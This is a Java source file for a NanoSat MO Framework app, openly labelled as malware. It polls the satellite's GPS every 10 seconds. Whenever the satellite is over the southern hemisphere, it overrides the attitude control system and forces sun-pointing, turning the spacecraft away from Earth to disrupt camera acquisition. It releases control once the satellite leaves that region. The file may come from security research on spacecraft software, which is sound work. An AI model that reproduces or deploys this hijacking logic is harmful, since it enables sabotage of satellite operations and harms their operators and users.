/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package esa.mo.nmf.apps;

import esa.mo.nmf.MonitorAndControlNMFAdapter;
import esa.mo.nmf.NMFException;
import esa.mo.nmf.NMFInterface;
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.ccsds.moims.mo.mal.MALException;
import org.ccsds.moims.mo.mal.MALInteractionException;
import org.ccsds.moims.mo.mal.structures.Duration;
import org.ccsds.moims.mo.mal.structures.UInteger;
import org.ccsds.moims.mo.platform.autonomousadcs.structures.AttitudeMode;
import esa.mo.helpertools.misc.TaskScheduler;
import java.util.concurrent.TimeUnit;
import org.ccsds.moims.mo.platform.autonomousadcs.structures.AttitudeModeNadirPointing;
import org.ccsds.moims.mo.platform.autonomousadcs.structures.AttitudeModeSunPointing;
import org.ccsds.moims.mo.platform.gps.body.GetLastKnownPositionResponse;


/**
 * A malware attack that hijacks the ADCS to disturb the functionality of the camera acquisitor system.
 * @author Nora Silven
 */
public class MalwareAttackMCAdapter extends MonitorAndControlNMFAdapter  {
    
    private static final Logger LOGGER = Logger.getLogger(MalwareAttackMCAdapter.class.getName());
    private NMFInterface nmf;
    private MalwareAttackGPSHandler GPSHandler;
    private final TaskScheduler periodicGPSTimer = new TaskScheduler(1);
    
    
    /**
     * INitialize the connection that makes the app a provider.
     * @param nmfProvider the connector
     */
    public MalwareAttackMCAdapter(final NMFInterface nmfProvider) {
        this.nmf = nmfProvider;
        this.GPSHandler = new MalwareAttackGPSHandler(this);
    }
    
    
    /**
     * Getter for the connector
     * @return the connector
     */
    public NMFInterface getConnector() {
        return nmf;
    }
    
    
    /**
     * Make a change to the active attitude mode.
     * @param duration the timespan that the attitude mode should last
     * @param attitudeMode the desired attitude mode
     * @return success status
     */
    private UInteger executeAdcsModeAction(Duration duration, AttitudeMode attitudeMode) {
        if (duration != null) {
            // Negative Durations are not allowed!
            if (duration.getValue() < 0) {
                return new UInteger(1);
            }
            if (duration.getValue() == 0) {
                // Adhere to the ADCS Service interface
                duration = null;
            }
        }
        
        try {
            nmf.getPlatformServices().getAutonomousADCSService().setDesiredAttitude(duration, attitudeMode);
        } catch (MALInteractionException | MALException | NMFException ex) {
            LOGGER.log(Level.SEVERE, null, ex);
            return new UInteger(3);
        } catch (IOException ex) {
            LOGGER.log(Level.SEVERE, null, ex);
            return new UInteger(4);
        }
        
        return null; // Success
    }
    
    
    /**
     * Monitor GPS location and hijack ADCS when flying over the southern hemisphere.
     */
    public void startGPSMonitoring() {
        // Get current location every 10 seconds.
        this.periodicGPSTimer.scheduleTask(new Thread(() -> {
            GetLastKnownPositionResponse pos = this.GPSHandler.getCurrentPosition();
            
            double lattitude = pos.getBodyElement0().getLatitude();
            double longitude = pos.getBodyElement0().getLongitude();
            double altitude = pos.getBodyElement0().getAltitude();
            
            // Satellite flies over southern hemisphere.
            if ((lattitude < 0) && (lattitude > -90)) {
                // Rotate satellite away from the earth.
                try {
                    AttitudeMode attMode = nmf.getPlatformServices().getAutonomousADCSService().getStatus().getBodyElement5();
                
                    if (!(attMode instanceof AttitudeModeSunPointing)) {
                        AttitudeMode desiredAttitude = new AttitudeModeSunPointing();
                        this.executeAdcsModeAction(new Duration(0), null);
                        this.executeAdcsModeAction(new Duration(2850), desiredAttitude);
                    }
                } catch (MALException | MALInteractionException | NMFException | IOException ex) {
                    LOGGER.log(Level.SEVERE, null, ex);
                }
            // The satellite has left the southern hemisphere.
            } else {
                // Return to the idle attitude mode and let go of control over ADCS.
                try {
                    AttitudeMode attMode = nmf.getPlatformServices().getAutonomousADCSService().getStatus().getBodyElement5();
                
                    if (attMode instanceof AttitudeModeSunPointing) {
                        AttitudeMode desiredAttitude = new AttitudeModeNadirPointing();
                        this.executeAdcsModeAction(new Duration(0), null);
                    }
                } catch (MALException | MALInteractionException | NMFException | IOException ex) {
                    LOGGER.log(Level.SEVERE, null, ex);
                }
            }
        }), 0, 10, TimeUnit.SECONDS, true); // 10 seconds
    }
    
}
